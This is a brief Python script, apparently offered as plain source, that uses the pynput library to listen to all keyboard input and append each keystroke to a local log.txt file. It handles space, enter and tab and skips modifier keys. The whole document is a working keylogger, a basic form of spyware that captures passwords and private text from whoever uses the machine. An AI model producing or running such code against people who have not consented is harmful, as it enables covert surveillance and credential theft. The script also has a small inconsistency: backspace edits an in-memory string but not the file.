from pynput.keyboard import Listener

# Initialize an empty string to hold the current text
log_text = ""

def write_to_file(key):
    global log_text

    # Convert the key object to a string
    letter = str(key).replace("'", "")

    # Handle different special keys
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = "\n"
    elif letter == 'Key.tab':
        letter = "\t"
    elif letter == 'Key.backspace':
        log_text = log_text[:-1]
        return  
    elif letter in ('Key.shift', 'Key.shift_r', 'Key.ctrl_l', 'Key.ctrl_r', 'Key.alt_l', 'Key.alt_r', 'Key.cmd', 'Key.esc'):
        return  
    else:
        # Handle printable characters
        if len(letter) == 1:  # Check if it's a single character (printable)
            letter = letter

    # Update log_text
    log_text += letter

    # Write only the latest character to the file
    with open("log.txt", 'a') as f:
        f.write(letter)

# Start listening to the keyboard events
with Listener(on_press=write_to_file) as listener:
    listener.join()
